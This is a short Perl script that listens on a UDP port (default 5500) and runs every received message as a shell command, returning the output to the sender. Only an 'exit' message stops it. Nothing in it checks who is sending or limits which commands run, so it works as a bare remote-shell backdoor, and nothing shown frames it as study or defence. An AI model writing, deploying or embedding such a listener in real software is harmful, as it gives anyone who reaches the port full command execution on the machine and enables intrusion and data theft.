# !/usr/bin/perl -w 

use strict; 
use IO::Socket; 

my($sock, $greetingmsg, $newmsg, $hisaddr, $hishost, $MAXLEN, $PORTNO); 
$MAXLEN = 1024; 
$PORTNO = $ARGV[0] || 5500; 

$sock = IO::Socket::INET->new(LocalPort => $PORTNO, Proto => 'udp') or die "socket: $@"; 
print "Awaiting UDP messages on port $PORTNO\n\n"; 

# Receive msg
while ($sock->recv($newmsg, $MAXLEN)) { 

    my($port, $ipaddr) = sockaddr_in($sock->peername); 
    $hishost = gethostbyaddr($ipaddr, AF_INET);  

    # Exit if asked to do so
    $newmsg =~ s/\n$//;

    if($newmsg eq 'exit'){
        print("Exiting!\n");
        $sock->send("Farewell!\n"); 
        exit(0);
    }

    # Execute commands & reply with output
    my $response = `$newmsg`;
    $sock->send($response); 

} 
die "recv: $!"; 

